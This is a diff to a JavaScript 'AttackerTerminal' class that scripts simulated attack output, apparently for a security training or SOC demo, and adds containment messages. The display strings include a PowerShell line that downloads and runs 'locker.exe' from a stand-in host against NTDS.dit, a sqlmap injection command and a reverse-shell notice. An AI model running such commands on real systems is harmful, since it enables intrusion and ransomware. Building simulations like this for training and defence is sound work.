@@ -212,7 +212,8 @@ class AttackerTerminal {
           { type: 'out', text: '389/tcp  open  ldap\n', delay: 100 },
           { type: 'out', text: '445/tcp  open  microsoft-ds\n', delay: 100 },
           { type: 'out', text: '3389/tcp open  ms-wbt-server\n\n', delay: 100 },
-          { type: 'out', text: '[+] Directory services detected. Candidate exploit vector: SMB port 445.\n', delay: 150 }
+          { type: 'out', text: '[+] Directory services detected. Core AD Database file: NTDS.dit\n', delay: 150 },
+          { type: 'out', text: '[i] Exploit payload queued: Encrypt NTDS.dit via locker.exe macro on SMB port 445.\n', delay: 100 }
         );
         break;
 
@@ -228,7 +229,8 @@ class AttackerTerminal {
           { type: 'out', text: '[+] Authenticated successfully. Spawning remote system shell...\n', delay: 200 },
           { type: 'out', text: 'C:\\Windows\\system32> powershell -c "Invoke-WebRequest -Uri http://malware.org/locker.exe -OutFile C:\\Windows\\Temp\\locker.exe; C:\\Windows\\Temp\\locker.exe --database C:\\Windows\\NTDS\\NTDS.dit"\n', delay: 400 },
           { type: 'out', text: '[!] CRYPTOLOCKER: ENCRYPTING AD DATABASE: NTDS.dit... DONE\n', delay: 200 },
-          { type: 'out', text: '[!] ENTERPRISE NETWORK ACCESS LOCKED. AD CREDENTIALS CORRUPTED.\n', delay: 100 }
+          { type: 'out', text: '[!] ENTERPRISE NETWORK ACCESS LOCKED. AD CREDENTIALS CORRUPTED.\n', delay: 100 },
+          { type: 'out', text: '[!] SOAR CONTAINMENT TRIGGERED: Subnet VLAN_20 isolated.\n', delay: 100 }
         );
         break;
 
@@ -364,7 +366,8 @@ class AttackerTerminal {
           { type: 'out', text: '[*] Retrieving database records...\n', delay: 300 },
           { type: 'out', text: '| admin@shop.local | $2b$12$Zad92... | 4000-1234-5678-9010 |\n', delay: 150 },
           { type: 'out', text: '| buyer@corp.local | $2b$12$Asa10... | 4111-2222-3333-4444 |\n', delay: 100 },
-          { type: 'out', text: '[!] DATABASE DUMP EXFILTRATION COMPLETED (ecommerce.clients: 24,050 rows).\n', delay: 200 }
+          { type: 'out', text: '[!] DATABASE DUMP EXFILTRATION COMPLETED (ecommerce.clients: 24,050 rows).\n', delay: 200 },
+          { type: 'out', text: '[!] WAF TRIGGERED: Firewall response action status set to BLOCKED.\n', delay: 100 }
         );
         break;
 
@@ -373,7 +376,7 @@ class AttackerTerminal {
           { type: 'cmd', text: 'sqlmap -u "http://10.0.1.20/api/v1/users?id=1" --dbs' },
           { type: 'out', text: '\n[!] CRITICAL ERROR: Connection dropped. Connection blocked by peer WAF.\n', delay: 350 },
           { type: 'out', text: '[-] Connection timed out. Target unreachable.\n', delay: 200 },
-          { type: 'out', text: '[-] Attacker IP blocked by automated WAF containment rules.\n', delay: 150 }
+          { type: 'out', text: '[-] Attacker IP BLOCKED by automated WAF containment rules.\n', delay: 150 }
         );
         break;
 
@@ -479,7 +482,7 @@ class AttackerTerminal {
           { type: 'out', text: 'Nmap scan report for executive-workstation.local (172.16.5.150)\n', delay: 200 },
           { type: 'out', text: 'PORT    STATE SERVICE\n', delay: 50 },
           { type: 'out', text: '443/tcp open  https\n\n', delay: 50 },
-          { type: 'out', text: '[+] Workstation online. Local secure services active.\n', delay: 100 }
+          { type: 'out', text: '[+] Workstation online. Exploit candidate: MSHTML RCE (CVE-2021-40444).\n', delay: 100 }
         );
         break;
 
@@ -491,7 +494,7 @@ class AttackerTerminal {
           { type: 'out', text: '[*] Awaiting recipient document macro execution...\n', delay: 400 },
           { type: 'out', text: '[*] Word doc exploit triggered MSHTML vulnerability (CVE-2021-40444)\n', delay: 300 },
           { type: 'out', text: '[*] Backdoor shell established: 10.10.14.90:4444 <- 172.16.5.150:50124\n', delay: 100 },
-          { type: 'out', text: '[i] Next action: Execute credential dump & session hijack.\n', delay: 100 }
+          { type: 'out', text: '[i] Next action: Deploy locker payload (Encrypted extension: .cryptolocker)\n', delay: 100 }
         );
         break;
 
@@ -505,7 +508,8 @@ class AttackerTerminal {
           { type: 'out', text: '[!] BEC: Sending redirect email to vendor account payment portal... [OK]\n', delay: 150 },
           { type: 'out', text: '[!] BEC: Routing $180,000 corporate payment to external offshore escrow. [OK]\n', delay: 150 },
           { type: 'out', text: '[!] BEC: Deleting outgoing mail records to prevent operator detection.\n', delay: 100 },
-          { type: 'out', text: '[!] FRAUD COMPLETE: SESSION CREDENTIALS HARVESTED. DATA COPIES LOCKED: .cryptolocker\n', delay: 200 }
+          { type: 'out', text: '[!] FRAUD COMPLETE: SESSION CREDENTIALS HARVESTED. DATA COPIES LOCKED: .cryptolocker\n', delay: 200 },
+          { type: 'out', text: '[!] CONTAINMENT: Executive Active Directory account status set to REVOKED.\n', delay: 100 }
         );
         break;
 
